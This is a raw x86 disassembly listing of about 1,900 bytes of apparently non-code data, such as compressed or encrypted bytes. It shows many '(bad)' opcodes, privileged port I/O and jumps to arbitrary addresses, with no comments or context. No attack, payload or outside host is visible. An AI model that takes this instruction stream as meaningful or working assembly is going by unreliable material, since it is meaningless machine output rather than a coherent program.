  40fe3f:	xor    esi,DWORD PTR [ebp+0x1c61e887]
  40fe45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe46:	addr16 cmp al,ch
  40fe49:	scas   al,BYTE PTR es:[edi]
  40fe4a:	mov    fs,edx
  40fe4c:	sbb    al,0x6c
  40fe4e:	aas    
  40fe4f:	jo     0x40fea6
  40fe51:	call   0xe111:0xca8e2cbc
  40fe58:	loop   0x40fe51
  40fe5a:	and    eax,DWORD PTR [esp+ecx*8-0x4]
  40fe5e:	ret    
  40fe5f:	or     ch,BYTE PTR ds:0xf9cf8150
  40fe65:	bound  edx,QWORD PTR [eax-0x17de0019]
  40fe6b:	hlt    
  40fe6c:	repnz stos BYTE PTR es:[edi],al
  40fe6e:	or     bh,bl
  40fe70:	fild   WORD PTR [edi+0x64]
  40fe73:	out    0xbb,eax
  40fe75:	jmp    DWORD PTR [esi]
  40fe77:	mov    ds:0x6acab1f4,al
  40fe7c:	dec    ecx
  40fe7d:	xor    al,0x30
  40fe7f:	cmc    
  40fe80:	mov    al,0x90
  40fe82:	dec    esi
  40fe83:	sub    edx,DWORD PTR [ecx+eiz*4]
  40fe86:	icebp  
  40fe87:	push   cs
  40fe88:	xor    edi,edx
  40fe8a:	ds mov ebp,0x13f80333
  40fe90:	lods   al,BYTE PTR ds:[esi]
  40fe91:	lods   eax,DWORD PTR ds:[esi]
  40fe92:	push   es
  40fe93:	or     cl,BYTE PTR [ebx+0x11]
  40fe96:	or     al,0x2d
  40fe98:	mov    bh,0x7a
  40fe9a:	(bad)  
  40fe9c:	inc    edi
  40fe9d:	js     0x40fedf
  40fe9f:	sar    DWORD PTR [edx-0x2e5b5735],cl
  40fea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fea6:	mov    ecx,0xbb350e3a
  40feab:	mov    DWORD PTR [ecx+0x29],ebx
  40feae:	push   cs
  40feaf:	inc    esi
  40feb0:	adc    al,0x56
  40feb2:	mov    dl,0xfc
  40feb4:	mov    dh,0x8d
  40feb6:	stos   DWORD PTR es:[edi],eax
  40feb7:	cld    
  40feb8:	mov    edi,DWORD PTR [esi-0x2ebb544f]
  40febe:	fwait
  40febf:	sbb    eax,0xc00d0527
  40fec4:	out    dx,al
  40fec5:	je     0x40fe52
  40fec7:	or     BYTE PTR [eax-0x63],dl
  40feca:	inc    esi
  40fecb:	out    0x7,eax
  40fecd:	popa   
  40fece:	dec    ebp
  40fecf:	dec    edx
  40fed0:	in     eax,0x2
  40fed2:	std    
  40fed3:	sub    DWORD PTR [esi-0x5f],ecx
  40fed6:	push   ebp
  40fed7:	mov    bh,ah
  40fed9:	(bad)  
  40feda:	aas    
  40fedb:	mov    ds:0x1fbafbc1,al
  40fee0:	sub    edi,DWORD PTR [ecx-0x302d8fe2]
  40fee6:	(bad)  
  40fee7:	adc    eax,0x5404a860
  40feec:	push   edi
  40feed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feee:	bsr    cx,WORD PTR [ecx-0x5a9d028f]
  40fef6:	fdiv   QWORD PTR [edi]
  40fef8:	add    DWORD PTR [edi],esi
  40fefa:	or     eax,0xb24d094e
  40feff:	std    
  40ff00:	mov    BYTE PTR [edx+0x48],ch
  40ff03:	(bad)  
  40ff06:	imul   ecx,DWORD PTR [ecx-0x466748cd],0xb9d433cb
  40ff10:	add    eax,0x7651e560
  40ff15:	adc    BYTE PTR [eax-0x7c],cl
  40ff18:	ds inc edi
  40ff1a:	jl     0x40ff0f
  40ff1c:	dec    esp
  40ff1d:	and    bh,BYTE PTR [edx]
  40ff1f:	cmc    
  40ff20:	lock jnp 0x40fedf
  40ff23:	neg    DWORD PTR [ebx]
  40ff25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff26:	imul   ebp,DWORD PTR [edx-0x5125c947],0x57
  40ff2d:	dec    ebp
  40ff2e:	loopne 0x40ff19
  40ff30:	mov    ebp,0x8d4c1e0f
  40ff35:	dec    esp
  40ff36:	mov    ?,WORD PTR [ecx-0x5e7ee664]
  40ff3c:	stos   DWORD PTR es:[edi],eax
  40ff3d:	inc    edi
  40ff3e:	loopne 0x40ff96
  40ff40:	mov    ebp,edi
  40ff42:	cli    
  40ff43:	inc    esi
  40ff44:	jg     0x40ff13
  40ff46:	mov    ?,WORD PTR [edx+0x38]
  40ff49:	dec    edi
  40ff4a:	test   eax,0x6a40cf60
  40ff4f:	sub    DWORD PTR [edx-0xdb82307],eax
  40ff55:	call   FWORD PTR [eax-0x7727f050]
  40ff5b:	in     al,dx
  40ff5c:	stc    
  40ff5d:	add    eax,0xebec5ac6
  40ff62:	jo     0x40ff9c
  40ff64:	adc    eax,0xecce8864
  40ff69:	sub    al,0xb1
  40ff6b:	stc    
  40ff6c:	adc    eax,0xbce689d3
  40ff71:	in     al,0xeb
  40ff73:	pushf  
  40ff74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff75:	popa   
  40ff76:	push   cs
  40ff77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff78:	sbb    BYTE PTR [ecx-0x50],ah
  40ff7b:	or     eax,ebx
  40ff7d:	xlat   BYTE PTR ds:[ebx]
  40ff7e:	shl    DWORD PTR [ebx+0x25ccc575],1
  40ff84:	iret   
  40ff85:	pop    edx
  40ff86:	xchg   edi,eax
  40ff87:	sub    al,0x7e
  40ff89:	mov    esi,0xc276b8d9
  40ff8e:	sub    eax,0x6452ab7e
  40ff93:	xor    al,0xe2
  40ff95:	inc    eax
  40ff96:	add    cl,0x18
  40ff99:	fimul  DWORD PTR [edx+0x4260d1bb]
  40ff9f:	in     al,dx
  40ffa0:	jnp    0x40ffe3
  40ffa2:	and    ch,BYTE PTR [eax]
  40ffa4:	jns    0x40ff2e
  40ffa6:	push   0xa654db66
  40ffab:	push   esp
  40ffac:	cmp    DWORD PTR [ebx],esp
  40ffae:	out    dx,al
  40ffaf:	fwait
  40ffb0:	sbb    DWORD PTR [edx+eax*8-0x4e632ea2],ecx
  40ffb7:	xchg   esp,eax
  40ffb8:	aad    0x67
  40ffba:	mov    WORD PTR [ecx+ebp*8+0x67],es
  40ffbe:	lds    esp,FWORD PTR [edi]
  40ffc0:	mov    ah,0x78
  40ffc2:	fnstcw WORD PTR [esi+0x1945dd4]
  40ffc8:	add    DWORD PTR [edi+0x6b],0xffffffc0
  40ffcc:	push   cs
  40ffcd:	sbb    al,0xac
  40ffcf:	pop    ss
  40ffd0:	xor    DWORD PTR [esi],ebx
  40ffd2:	mov    dl,0xc
  40ffd4:	jbe    0x410039
  40ffd6:	imul   ecx,DWORD PTR [ecx],0x53
  40ffd9:	out    dx,eax
  40ffda:	fs mov bl,0x35
  40ffdd:	imul   BYTE PTR [esi]
  40ffdf:	xor    DWORD PTR [edx-0x78],0xfffffff1
  40ffe3:	add    DWORD PTR [edi+0x79],edi
  40ffe6:	sub    BYTE PTR [edx+0x19b026de],ch
  40ffec:	cli    
  40ffed:	push   ecx
  40ffee:	xchg   ecx,eax
  40ffef:	add    BYTE PTR [ecx],dh
  40fff1:	pop    ebx
  40fff2:	fadd   st(4),st
  40fff4:	lahf   
  40fff5:	add    BYTE PTR [edi-0x61],dl
  40fff8:	lea    eax,[ecx+0x61]
  40fffb:	div    bl
  40fffd:	scas   eax,DWORD PTR es:[edi]
  40fffe:	adc    eax,ecx
  410000:	shl    DWORD PTR [ebp-0x12395316],1
  410006:	fcomp  st(1)
  410008:	stos   DWORD PTR es:[edi],eax
  410009:	aad    0x3f
  41000b:	xchg   ebp,eax
  41000c:	outs   dx,BYTE PTR ds:[esi]
  41000d:	jmp    0x410080
  41000f:	in     al,dx
  410010:	idiv   DWORD PTR [edi]
  410012:	pop    ecx
  410013:	pusha  
  410014:	jnp    0x410046
  410016:	jne    0x40ffc3
  410018:	cmp    DWORD PTR [edx],esp
  41001a:	mov    al,ds:0x2c744baf
  41001f:	test   BYTE PTR [edx+0x33],ch
  410022:	pop    ebp
  410023:	fbstp  TBYTE PTR [ecx]
  410025:	sub    BYTE PTR ds:0x95655b31,bl
  41002b:	ret    0x83de
  41002e:	mov    eax,ds:0x3662b8ee
  410033:	and    al,0x53
  410035:	ins    DWORD PTR es:[edi],dx
  410036:	ror    dl,0xe7
  410039:	cwde   
  41003a:	lahf   
  41003b:	xor    al,0x61
  41003d:	popa   
  41003e:	pushf  
  41003f:	cmc    
  410040:	inc    eax
  410041:	pop    eax
  410042:	and    al,0x51
  410044:	(bad)  
  410045:	cdq    
  410046:	mov    ds:0xa4ddceb9,al
  41004b:	inc    esp
  41004c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41004d:	clc    
  41004e:	or     eax,0xa2910485
  410053:	sbb    BYTE PTR [ebp+0x1],ch
  410056:	fmul   QWORD PTR [edi-0x4de48aac]
  41005c:	xor    eax,0xd80ae6da
  410061:	pop    ebx
  410062:	push   edi
  410063:	dec    eax
  410064:	retf   
  410065:	test   al,0x7d
  410067:	sbb    eax,0x84b80e03
  41006c:	int3   
  41006d:	rcr    DWORD PTR [eax+0x57d70c4a],1
  410073:	lods   al,BYTE PTR ds:[esi]
  410074:	mov    dh,0x11
  410076:	cwde   
  410077:	mov    bl,BYTE PTR [ebx+edx*4]
  41007a:	rcl    DWORD PTR [ebx],1
  41007c:	lods   al,BYTE PTR fs:[esi]
  41007e:	or     DWORD PTR [ecx+0x28668405],esp
  410084:	addr16 (bad) 
  410086:	les    ebp,FWORD PTR [eax]
  410088:	inc    ecx
  410089:	adc    BYTE PTR [ecx-0x76],dl
  41008c:	and    al,BYTE PTR [ecx]
  41008e:	xchg   esi,eax
  41008f:	push   eax
  410090:	or     al,0x91
  410092:	mov    ch,0xa5
  410094:	retf   0xb903
  410097:	out    dx,eax
  410098:	ret    0x5df9
  41009b:	fist   WORD PTR [eax+ebp*8]
  41009e:	lea    esp,[ebp+ebx*1+0x12]
  4100a2:	int3   
  4100a3:	ds jne 0x41009f
  4100a6:	dec    esi
  4100a7:	sub    eax,ebp
  4100a9:	jle    0x410081
  4100ab:	test   al,0xec
  4100ad:	sbb    DWORD PTR [ebp+0x440d4fa8],eax
  4100b3:	jb     0x41006a
  4100b5:	lods   eax,DWORD PTR ds:[esi]
  4100b6:	mov    edi,0xfeb9e33d
  4100bb:	or     eax,0xf34d5648
  4100c0:	inc    esi
  4100c1:	push   eax
  4100c2:	fwait
  4100c3:	pop    ebx
  4100c4:	sbb    DWORD PTR [edx+edx*2-0x1d98683d],ecx
  4100cb:	mov    bh,0x27
  4100cd:	fdivr  DWORD PTR [ebx+0x3a]
  4100d0:	add    ch,BYTE PTR [edi]
  4100d2:	push   sp
  4100d4:	clc    
  4100d5:	icebp  
  4100d6:	pop    ds
  4100d7:	out    dx,eax
  4100d8:	fnsave [edx-0x1ef89dd1]
  4100de:	loope  0x4100c5
  4100e0:	je     0x4100e4
  4100e2:	daa    
  4100e3:	sub    edx,DWORD PTR [eax+0x70]
  4100e6:	repz push 0xffffffaa
  4100e9:	add    dh,ah
  4100eb:	fild   WORD PTR [ecx-0x61]
  4100ee:	mov    al,0xae
  4100f0:	jge    0x4100bc
  4100f2:	pop    DWORD PTR ds:0x8c64fc29
  4100f8:	outs   dx,BYTE PTR ds:[esi]
  4100f9:	ret    
  4100fa:	pop    ebp
  4100fb:	jns    0x410130
  4100fd:	add    eax,0xf3c03317
  410102:	jo     0x410085
  410104:	mov    edx,0x1969cb14
  410109:	call   FWORD PTR [edx+eiz*4-0x8]
  41010d:	or     DWORD PTR [eax+ebp*4+0x45],0x6c
  410112:	inc    eax
  410113:	aaa    
  410114:	pop    eax
  410115:	mov    dl,0x61
  410117:	das    
  410118:	jnp    0x4100bc
  41011a:	adc    DWORD PTR [ebp-0x5e],ebp
  41011d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41011e:	mov    edi,0x3868765b
  410123:	fwait
  410124:	or     eax,0x3a5539f
  410129:	jo     0x410173
  41012b:	popa   
  41012c:	jmp    0x3edb:0xc05616f2
  410133:	ins    DWORD PTR es:[edi],dx
  410134:	push   0xffffff96
  410136:	add    al,0xd8
  410138:	sbb    DWORD PTR [edx],edi
  41013a:	popa   
  41013b:	sub    DWORD PTR [eax],edx
  41013d:	mov    edx,0xdf5a8299
  410142:	fwait
  410143:	popf   
  410144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410145:	popa   
  410146:	inc    ecx
  410147:	and    ebp,DWORD PTR [edx+esi*8]
  41014a:	loop   0x4101c1
  41014c:	or     cl,BYTE PTR [esi+0x34]
  41014f:	pop    ebp
  410150:	(bad)  [ebx]
  410152:	test   DWORD PTR ds:0xbee53b8b,0xba81caab
  41015c:	and    al,0x61
  41015e:	jg     0x4101ae
  410160:	popa   
  410161:	and    eax,0xd59f21e8
  410166:	mov    ebx,0xe5902f62
  41016b:	fst    st(7)
  41016d:	jg     0x41013b
  41016f:	xor    ch,BYTE PTR [ecx-0x73]
  410172:	test   edi,esp
  410174:	cmc    
  410175:	push   eax
  410176:	xor    eax,0x527e3d08
  41017b:	mov    DWORD PTR [ebx],edi
  41017d:	inc    ebx
  41017e:	(bad)  
  410180:	jmp    0x3e5e182c
  410185:	pop    ecx
  410186:	inc    edi
  410187:	fisubr DWORD PTR [edx+eax*8+0x1dd7377d]
  41018e:	xor    esi,ebx
  410190:	addr16 repnz adc eax,0x1ef1145a
  410197:	jno    0x4101a7
  410199:	call   FWORD PTR [ecx+edx*2]
  41019c:	outs   dx,DWORD PTR ds:[esi]
  41019d:	inc    ecx
  41019e:	pop    esp
  41019f:	xchg   esp,eax
  4101a0:	pop    ds
  4101a1:	les    ebp,FWORD PTR [ecx+0x39d0e589]
  4101a7:	jecxz  0x410178
  4101a9:	push   ebp
  4101aa:	cmp    DWORD PTR ds:0x6fb4efe8,edx
  4101b0:	ds adc eax,0x952bbece
  4101b6:	shl    BYTE PTR [edx],0x37
  4101b9:	mov    esi,0xc892350c
  4101be:	adc    cl,BYTE PTR [eax+0x1b]
  4101c1:	popf   
  4101c2:	adc    ebx,DWORD PTR [edx+esi*4+0x51c6823a]
  4101c9:	mov    esp,0x252c1705
  4101ce:	and    BYTE PTR [ebx-0x5c],0x2
  4101d2:	aas    
  4101d3:	cdq    
  4101d4:	imul   ecx,DWORD PTR [ebx],0x9cdf15a0
  4101da:	cmp    BYTE PTR [esi+0x3f],al
  4101dd:	adc    eax,0xb036e4c2
  4101e2:	repz (bad) 
  4101e4:	test   al,0xee
  4101e6:	push   ds
  4101e7:	adc    eax,0x8fbcc656
  4101ec:	cmp    eax,0x37ac29dd
  4101f1:	push   0xf3444495
  4101f6:	fmul   st(1),st
  4101f8:	xchg   ebx,eax
  4101f9:	mov    bh,0xd0
  4101fb:	jo     0x410229
  4101fd:	xchg   ebx,eax
  4101fe:	xor    BYTE PTR [edx-0x2a96819e],ah
  410204:	std    
  410205:	stc    
  410206:	repz and al,0xda
  410209:	in     al,dx
  41020a:	xor    BYTE PTR [edi-0x63],0x4b
  41020e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41020f:	shl    bl,1
  410211:	gs xchg ebx,eax
  410213:	fwait
  410214:	dec    edx
  410215:	les    edi,FWORD PTR [esi+0x19]
  410218:	scas   eax,DWORD PTR es:[edi]
  410219:	enter  0x53f3,0xbf
  41021d:	fist   WORD PTR [eax-0xc]
  410220:	adc    ebx,DWORD PTR [eax-0x1e]
  410223:	push   cs
  410224:	loope  0x410217
  410226:	push   ecx
  410227:	dec    ebp
  410228:	lods   eax,DWORD PTR ds:[esi]
  410229:	xchg   ecx,eax
  41022a:	push   esi
  41022b:	jae    0x410289
  41022d:	xchg   esp,eax
  41022e:	imul   esi,DWORD PTR [esi-0x7c],0x5269c4f9
  410235:	pop    eax
  410236:	out    dx,al
  410237:	movq   mm2,mm4
  41023a:	repnz inc ebp
  41023c:	fadd   QWORD PTR [edx+esi*4]
  41023f:	(bad)
  410243:	(bad)  
  410244:	cli    
  410245:	adc    DWORD PTR [ebx+edx*1-0x44ecf5eb],esp
  41024c:	fchs   
  41024e:	mov    ebx,0x369d68c0
  410253:	sbb    al,0xa
  410255:	xchg   ebp,eax
  410256:	nop
  410257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410258:	in     al,dx
  410259:	and    ch,BYTE PTR [edi+ecx*8+0x64]
  41025d:	jp     0x41023a
  41025f:	aam    0x1e
  410261:	fdiv   QWORD PTR [edi-0x6f]
  410264:	mov    ch,0xf6
  410266:	lods   eax,DWORD PTR ds:[esi]
  410267:	or     BYTE PTR [eax*2+0x3d2711eb],al
  41026e:	inc    ecx
  41026f:	ret    
  410270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410271:	gs xchg edx,eax
  410273:	xor    dh,cl
  410275:	mov    ds:0xb28df930,eax
  41027a:	out    dx,al
  41027b:	sbb    BYTE PTR ds:[ebx+0x4c],ch
  41027f:	pushf  
  410280:	adc    edx,ecx
  410282:	arpl   WORD PTR [ecx+0x59],ax
  410285:	push   cs
  410286:	aaa    
  410287:	stos   DWORD PTR es:[edi],eax
  410288:	inc    edi
  410289:	gs jbe 0x4102c0
  41028c:	inc    edx
  41028d:	leave  
  41028e:	(bad)  
  41028f:	clc    
  410290:	dec    edx
  410291:	xor    edi,DWORD PTR [ecx]
  410293:	scas   eax,DWORD PTR es:[edi]
  410294:	push   ss
  410295:	out    0xaf,eax
  410297:	cmp    dh,BYTE PTR ds:0xd2b0a8d7
  41029d:	in     eax,dx
  41029e:	pop    esi
  41029f:	(bad)  
  4102a0:	cmp    al,0xd0
  4102a2:	or     cl,BYTE PTR [ebp-0x1a]
  4102a5:	adc    al,0xa
  4102a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102a8:	push   cs
  4102a9:	cmc    
  4102aa:	add    al,0xa
  4102ac:	dec    ebx
  4102ad:	or     al,0xe4
  4102af:	sub    cl,dl
  4102b1:	ins    BYTE PTR es:[edi],dx
  4102b2:	outs   dx,DWORD PTR ds:[esi]
  4102b3:	xchg   edx,eax
  4102b4:	fld1   
  4102b6:	sub    ebp,0x69
  4102b9:	aam    0x5
  4102bb:	out    0xf9,eax
  4102bd:	aas    
  4102be:	cmp    eax,0x6b8fff70
  4102c3:	ja     0x4102a2
  4102c5:	retf   0xa4fe
  4102c8:	pop    ecx
  4102c9:	ins    BYTE PTR es:[edi],dx
  4102ca:	popf   
  4102cb:	ins    BYTE PTR es:[edi],dx
  4102cc:	bound  esi,QWORD PTR [ebx-0x2d]
  4102cf:	mov    esi,0x4772c78c
  4102d4:	dec    edi
  4102d5:	add    al,0xf3
  4102d7:	mov    esp,0x96594fce
  4102dc:	test   al,0xc7
  4102de:	(bad)  
  4102df:	mov    edi,0x46fc3dff
  4102e4:	stos   DWORD PTR es:[edi],eax
  4102e5:	repz xor edx,DWORD PTR [esi+0x7]
  4102e9:	jmp    0xd3d4:0xe97386a8
  4102f0:	jecxz  0x41030e
  4102f2:	mov    eax,ds:0x20c93bed
  4102f7:	std    
  4102f8:	add    eax,0xa6615ede
  4102fd:	xchg   ebx,eax
  4102fe:	dec    edx
  4102ff:	aad    0x27
  410301:	jne    0x410291
  410303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410304:	aas    
  410305:	in     al,0xa7
  410307:	dec    ebx
  410308:	xor    BYTE PTR [esi],bh
  41030a:	inc    ebx
  41030b:	test   eax,0x9a921a16
  410310:	or     eax,0x23f40eba
  410315:	loopne 0x4102fa
  410317:	xchg   esi,eax
  410318:	jge    0x410387
  41031a:	lds    esi,FWORD PTR [eax-0x2b048f50]
  410320:	in     eax,dx
  410321:	fwait
  410322:	sbb    esi,DWORD PTR [esi+0x26af501c]
  410328:	pop    esi
  410329:	adc    ebx,DWORD PTR [ebx+0xa]
  41032c:	stos   BYTE PTR es:[edi],al
  41032d:	jns    0x410396
  41032f:	sbb    BYTE PTR [ebx-0x3d],bl
  410332:	aas    
  410333:	or     esp,DWORD PTR [ecx+0x3129df]
  410339:	(bad)  
  41033a:	pop    ds
  41033b:	outs   dx,DWORD PTR ds:[esi]
  41033c:	loop   0x410391
  41033e:	retf   0x7b23
  410341:	std    
  410342:	xor    al,0x1b
  410344:	rcr    BYTE PTR [eax-0x48],0x25
  410348:	lahf   
  410349:	mov    DWORD PTR [eax-0x1d613f5e],edi
  41034f:	ja     0x410343
  410351:	jo     0x4102ef
  410353:	das    
  410354:	push   ecx
  410355:	mov    ds:0xfcacd57a,eax
  41035a:	mov    ah,0x66
  41035c:	fidiv  DWORD PTR [ecx]
  41035e:	retf   
  41035f:	xor    ecx,DWORD PTR [ebx]
  410361:	fs and dh,cl
  410364:	mov    ah,0x51
  410366:	cmp    DWORD PTR ds:0x32971d5d,ecx
  41036c:	pop    esp
  41036d:	fs xchg ecx,eax
  41036f:	test   al,0xad
  410371:	addr16 popf 
  410373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410374:	push   es
  410375:	or     esp,ebp
  410377:	pop    ecx
  410378:	mov    ds:0xd671e664,eax
  41037d:	push   eax
  41037e:	scas   al,BYTE PTR es:[edi]
  41037f:	sti    
  410380:	mov    es,ebx
  410382:	lea    edi,[edi]
  410384:	sbb    al,0x9d
  410386:	push   ss
  410387:	mov    ebp,0xc8db5330
  41038c:	ja     0x4103f8
  41038e:	cmc    
  41038f:	(bad)  
  410390:	shl    BYTE PTR [esi-0x16b8c202],cl
  410396:	sbb    al,0xff
  410398:	les    ecx,FWORD PTR [ebx]
  41039a:	ins    DWORD PTR es:[edi],dx
  41039b:	daa    
  41039c:	cdq    
  41039d:	shl    DWORD PTR [edi],cl
  41039f:	popa   
  4103a0:	push   esi
  4103a1:	pop    esi
  4103a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103a3:	imul   eax,DWORD PTR [edi-0x78932263],0x61e61973
  4103ad:	cwde   
  4103ae:	lds    edx,FWORD PTR ds:0x24de1070
  4103b4:	sub    eax,0x6687c2e8
  4103b9:	mov    edi,DWORD PTR [eax-0x48]
  4103bc:	push   ebp
  4103bd:	aad    0xdc
  4103bf:	pop    esi
  4103c0:	mov    edx,0xf351b771
  4103c5:	xchg   ebx,eax
  4103c6:	ds enter 0xfbc1,0x59
  4103cb:	int    0x3b
  4103cd:	dec    ecx
  4103ce:	and    dh,ch
  4103d0:	or     ecx,esp
  4103d2:	mov    WORD PTR [eax],es
  4103d4:	icebp  
  4103d5:	dec    ecx
  4103d6:	mov    ebx,0x157141bf
  4103db:	jae    0x4103a4
  4103dd:	ficom  WORD PTR [ebx]
  4103df:	std    
  4103e0:	fisub  WORD PTR [edi+0x5468c789]
  4103e6:	sti    
  4103e7:	ds cdq 
  4103e9:	sbb    ah,BYTE PTR [esi]
  4103eb:	jg     0x41039c
  4103ed:	out    dx,al
  4103ee:	or     DWORD PTR [esi],esp
  4103f0:	sbb    DWORD PTR [edi+0x3e2ebb24],0xee9117b7
  4103fa:	inc    eax
  4103fb:	retf   0xf15e
  4103fe:	hlt    
  4103ff:	es inc esi
  410401:	out    0xc8,al
  410403:	jnp    0x410477
  410405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410406:	jmp    0x41c3727
  41040b:	icebp  
  41040c:	in     eax,dx
  41040d:	or     al,0xa5
  41040f:	idiv   BYTE PTR ds:0x4c89df17
  410415:	out    0x0,al
  410417:	sub    bh,BYTE PTR [esi+0x7f61589b]
  41041d:	sbb    BYTE PTR [edx+0x78],ah
  410420:	retf   
  410421:	jae    0x41041a
  410423:	mov    bh,0x6d
  410425:	add    BYTE PTR [edi+0x4b],dl
  410428:	ret    
  410429:	js     0x410410
  41042b:	jg     0x4103bb
  41042d:	daa    
  41042e:	test   eax,0x7660a895
  410433:	jbe    0x4104aa
  410435:	and    edx,esp
  410437:	push   ebp
  410438:	lock xor cl,cl
  41043b:	daa    
  41043c:	pop    esp
  41043d:	push   cs
  41043e:	pop    ds
  41043f:	cld    
  410440:	xchg   esp,eax
  410441:	(bad)
  410446:	xchg   DWORD PTR [si-0x4c63],ecx
  41044b:	add    DWORD PTR [ecx-0x86aa94f],ebp
  410451:	mov    dl,cl
  410453:	dec    eax
  410454:	int3   
  410455:	mov    ?,WORD PTR [esp+esi*4]
  410458:	cwde   
  410459:	aas    
  41045a:	inc    edx
  41045b:	ja     0x410411
  41045d:	add    al,0x1d
  41045f:	jmp    0x41045a
  410461:	jno    0x41044b
  410463:	jnp    0x4104ab
  410465:	mov    eax,ds:0x9cc7235
  41046a:	arpl   WORD PTR [edx+ebx*2],cx
  41046d:	aam    0xaa
  41046f:	dec    esi
  410470:	dec    ebx
  410471:	outs   dx,DWORD PTR ds:[esi]
  410472:	xor    dl,BYTE PTR [ecx+0x21c92630]
  410478:	fmul   DWORD PTR [edx+edx*2-0x4b]
  41047c:	mov    eax,0xbd23fc56
  410481:	fnsave [ebp-0x44]
  410484:	dec    ebp
  410485:	adc    DWORD PTR [edi+esi*4-0x47946718],0xa
  41048d:	adc    al,0x4e
  41048f:	jnp    0x410472
  410491:	jns    0x410419
  410493:	mov    ah,0x38
  410495:	(bad)  
  410496:	push   cs
  410497:	icebp  
  410498:	sahf   
  410499:	jnp    0x41045a
  41049b:	gs enter 0xabae,0x6f
  4104a0:	push   ecx
  4104a1:	rcr    BYTE PTR ds:0x689f1add,0xf5
  4104a8:	dec    edi
  4104a9:	(bad)  
  4104aa:	cld    
  4104ab:	ins    DWORD PTR es:[edi],dx
  4104ac:	inc    esp
  4104ad:	jp     0x41048d
  4104af:	repz jp 0x410510
  4104b2:	jp     0x410531
  4104b4:	sub    eax,esi
  4104b6:	cdq    
  4104b7:	or     DWORD PTR [eax],ebx
  4104b9:	jecxz  0x41045a
  4104bb:	ins    DWORD PTR es:[edi],dx
  4104bc:	xchg   DWORD PTR [ecx-0x7c],esi
  4104bf:	and    eax,edx
  4104c1:	xchg   BYTE PTR [ecx-0x8659a04],ch
  4104c7:	adc    BYTE PTR [eax+0x639eef0c],ch
  4104cd:	call   0xc47a1adb
  4104d2:	sar    ebp,0x66
  4104d5:	out    dx,al
  4104d6:	loope  0x410486
  4104d8:	js     0x41051f
  4104da:	sbb    esi,DWORD PTR [ecx]
  4104dc:	cld    
  4104dd:	repnz in eax,dx
  4104df:	outs   dx,DWORD PTR ds:[esi]
  4104e0:	xor    BYTE PTR [ecx*1+0x59c32e96],ah
  4104e7:	pop    esp
  4104e8:	dec    ebx
  4104e9:	pop    ebx
  4104ea:	dec    edi
  4104eb:	je     0x4104f1
  4104ed:	dec    eax
  4104ee:	iret   
  4104ef:	xchg   esi,eax
  4104f0:	adc    cl,BYTE PTR [edi]
  4104f2:	scas   eax,DWORD PTR es:[edi]
  4104f3:	jge    0x410573
  4104f5:	xchg   esi,eax
  4104f6:	fwait
  4104f7:	ret    
  4104f8:	push   esi
  4104f9:	and    ah,BYTE PTR [ecx-0x38090a79]
  4104ff:	cli    
  410500:	mov    ebp,0x3c03de58
  410505:	fdiv   QWORD PTR [esi+ebx*8-0x3]
  410509:	int3   
  41050a:	mov    WORD PTR [ecx+ebx*8],cs
  41050d:	imul   esp,ebp,0x732d080b
  410513:	inc    edi
  410514:	and    DWORD PTR [ecx+0x48540534],0x17e8f418
  41051e:	jle    0x4104c7
  410520:	into   
  410521:	push   0xffffffe5
  410523:	dec    esi
  410524:	mov    bl,0x87
  410526:	push   ecx
  410527:	cmp    DWORD PTR [ebx+0x5],eax
  41052a:	pop    ebp
  41052b:	leave  
  41052c:	enter  0x454f,0x6c
  410530:	cli    
  410531:	stos   BYTE PTR es:[edi],al
  410532:	test   ebp,ebx
  410534:	lock ds stc 
  410537:	jle    0x4104c1
  410539:	dec    ah
  41053b:	mov    eax,ds:0xfe583aeb
  410540:	adc    DWORD PTR [eax+0x25],ebx
  410543:	xor    cl,BYTE PTR [eax+0x8]
  410546:	xchg   esp,ecx
  410548:	iret   
  410549:	xchg   ecx,eax
  41054a:	ret    
  41054b:	ja     0x41052f
  41054d:	daa    
  41054e:	push   esi
  41054f:	scas   eax,DWORD PTR es:[edi]
  410550:	mov    edi,0xd243798e
  410555:	inc    ebx
  410556:	inc    esp
  410557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410558:	stc    
  410559:	stos   BYTE PTR es:[edi],al
  41055a:	mov    bx,0x23d9
  41055e:	xlat   BYTE PTR ds:[ebx]
  41055f:	fbstp  TBYTE PTR [ecx+ecx*8-0x7c6fbeb1]
  410566:	ja     0x4105d4
  410568:	(bad)  
  410569:	pop    ecx
  41056a:	mov    esp,0x902736ce
  41056f:	ja     0x41059a
  410571:	scas   eax,DWORD PTR es:[edi]
  410572:	in     eax,dx
  410573:	jns    0x410557
  410575:	mov    edx,0xcd978388
  41057a:	ins    DWORD PTR es:[edi],dx
  41057b:	dec    ecx
  41057c:	cwde   
  41057d:	std    
  41057e:	sub    al,0x7b
  410580:	test   eax,0x36fef680
  410585:	jp     0x4105fb
  410587:	xchg   esp,eax
  410588:	clc    
  410589:	jb     0x410582
  41058b:	or     esp,edi
  41058d:	jecxz  0x410542
  41058f:	sbb    BYTE PTR [edi+0x60d1d8f2],dh
  410595:	add    edx,eax
  410597:	nop
  410598:	hlt    
  410599:	cli    
  41059a:	imul   ebp,DWORD PTR [ebp+0x10c40906],0x58f7ed5e
  4105a4:	jno    0x410592
  4105a6:	out    0xd7,eax
  4105a8:	data16 fiadd WORD PTR [ebp-0x19]
  4105ac:	push   eax
  4105ad:	jp     0x410536
  4105af:	in     al,0xe1
  4105b1:	xchg   esp,eax
  4105b2:	cwde   
  4105b3:	mov    eax,ds:0x35142364
  4105b8:	test   ebp,ebp
